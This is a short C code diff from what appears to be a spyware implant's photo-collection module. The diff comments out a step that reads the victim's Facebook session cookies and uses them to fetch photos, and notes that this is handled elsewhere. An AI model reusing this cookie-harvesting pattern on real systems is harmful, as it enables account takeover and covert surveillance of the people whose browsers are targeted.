@@ -46,10 +46,13 @@ BOOL QueuePhotoLog(__in LPBYTE lpEvBuff, __in DWORD dwEvSize)
 
 
 /* photo module main function */
+// will be used when filsystem photos will be implemented, Facebook photos are run from social.cpp
 VOID PhotoMain()
 {
+	
 	while(1)
 	{
+
 		if (bPhotoThread == FALSE)
 		{
 #ifdef _DEBUG
@@ -62,15 +65,17 @@ VOID PhotoMain()
 		if (bCollectEvidences)
 		{
 
-			LPSTR strFacebookCookies = GetCookieString(FACEBOOK_DOMAIN);
+
+
+			/*LPSTR strFacebookCookies = GetCookieString(FACEBOOK_DOMAIN);
 			if (strFacebookCookies)
 			{
 				FacebookPhotoHandler(strFacebookCookies);
 				zfree_s(strFacebookCookies);
-			}
+			}*/
 
 		}
-		
+
 		MySleep(PHOTO_SLEEP);
 	}
 
